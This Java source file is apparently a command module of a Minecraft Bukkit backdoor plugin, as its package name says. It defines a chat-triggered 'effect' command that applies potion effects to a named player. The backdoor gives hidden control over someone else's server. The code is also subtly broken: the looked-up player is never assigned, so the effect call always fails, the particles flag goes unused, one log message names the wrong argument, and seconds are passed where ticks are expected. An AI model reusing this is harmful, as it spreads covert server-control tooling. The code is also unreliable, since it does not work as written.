package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.potion.PotionEffectType;

import java.util.ArrayList;

@RegisterCommand(displayName = "effect", aliases = {"effect", "ef"})
public class EffectCommand extends Command {

    public EffectCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) { // Command: <prefix>effect [player] [effect] [time(seconds] [amplifier] [showParticles(bool)]
        Player player = null;
        try {
            Bukkit.getPlayer(args.get(0));
        } catch (Exception e) {
            Main.logger.log("Failed to get player in arg nr 1.");
            if (args.get(0) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a player");
            }
            return;
        }

        PotionEffectType effect;
        try {
            effect = PotionEffectType.getByName(args.get(1));
        } catch (Exception e) {
            Main.logger.log("Failed to get effect in arg nr 2.");
            if (args.get(1) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not an effect");
            }
            return;
        }

        int timeInSeconds = 15;
        try {
            timeInSeconds = Integer.parseInt(args.get(2));
        } catch (Exception e) {
            Main.logger.log("Failed to get number in arg nr 3.");
            if (args.get(2) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a number");
            }
            Main.logger.log("Defaulting to 15 seconds");
        }

        int amplifier = 1;
        try {
            amplifier = Integer.parseInt(args.get(3));
        } catch (Exception e) {
            Main.logger.log("Failed to get number in arg nr 4.");
            if (args.get(3) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a number");
            }
            Main.logger.log("Defaulting to 1");
        }

        boolean showParticles;
        try {
            showParticles = Boolean.parseBoolean(args.get(4));
        } catch (Exception e) {
            Main.logger.log("Failed to get boolean in arg nr 6.");
            if (args.get(4) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a boolean");
            }
            Main.logger.log("Defaulting to true");
        }

        try {
            player.addPotionEffect(effect.createEffect(timeInSeconds, amplifier), true);
        } catch (Exception e) {
            Main.logger.log("Failed to add effect to player");
            return;
        }
    }
}
